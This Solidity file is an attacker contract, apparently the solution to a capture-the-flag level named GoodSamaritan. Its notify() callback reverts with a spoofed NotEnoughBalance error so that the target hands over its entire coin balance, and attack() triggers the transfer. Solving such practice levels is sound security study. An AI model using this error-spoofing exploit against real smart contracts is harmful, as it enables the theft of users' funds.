// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./target/GoodSamaritan.sol";

contract GoodSamaritanAttacker is INotifyable {
    GoodSamaritan public goodSamaritan;
    Coin public coin;
    error NotEnoughBalance();

    constructor(address _goodSamaritan) {
        goodSamaritan = GoodSamaritan(_goodSamaritan);
        coin = Coin(goodSamaritan.coin());
    }

    function notify(uint256) external view override {
        if (coin.balances(address(goodSamaritan.wallet())) > 0) {
            revert NotEnoughBalance();
        }
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }

    function getWalletBalance() public view returns (uint256) {
        return coin.balances(address(goodSamaritan.wallet()));
    }
}
